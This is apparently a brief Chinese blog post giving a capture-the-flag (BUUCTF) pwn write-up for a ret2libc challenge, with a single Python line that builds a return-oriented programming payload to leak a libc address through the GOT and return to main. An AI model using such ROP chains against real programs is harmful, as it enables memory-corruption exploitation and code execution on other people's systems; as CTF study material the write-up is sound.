+++
title = "wp"
date = "2026-04-15"
type = "post"
categories = ['BUU']
tags = ['BUU']
draft = false
+++
好久没做了
一道ret2libc，但看好像还有ret2csu
exp：exp
以前libcsearcher里的脚本跟这次的有点区别，以这次的为准，
```python
payload = b'A' * offset + p64(ret_addr) + p64(pop_rdi) + p64(1) +p64(pop_rsi) + p64(got) + p64(4) + p64(plt) + p64(main_addr)  
```
